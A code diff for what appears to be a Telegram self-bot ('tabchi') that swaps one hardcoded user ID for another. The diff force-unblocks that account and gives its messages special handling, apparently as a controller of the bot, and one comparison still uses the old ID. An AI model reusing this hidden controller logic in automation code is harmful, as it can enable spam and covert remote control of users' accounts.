@@ -258,7 +258,7 @@ admin : @nimaftf ]]
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 119953172,
+        bot_user_id_ = 270747317,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -520,7 +520,7 @@ function process_links(text)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(119953172)
+    tdcli.unblockUser(270747317)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
     tdcli.sendBotStartMessage(123456789, 123456789, "new")
@@ -532,11 +532,11 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 119953172
+    user_id_ = 270747317
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 119953172 then
+    if msg.sender_user_id_ == 270747317 then
       if msg.content_.text_ then
         if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 119953172 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
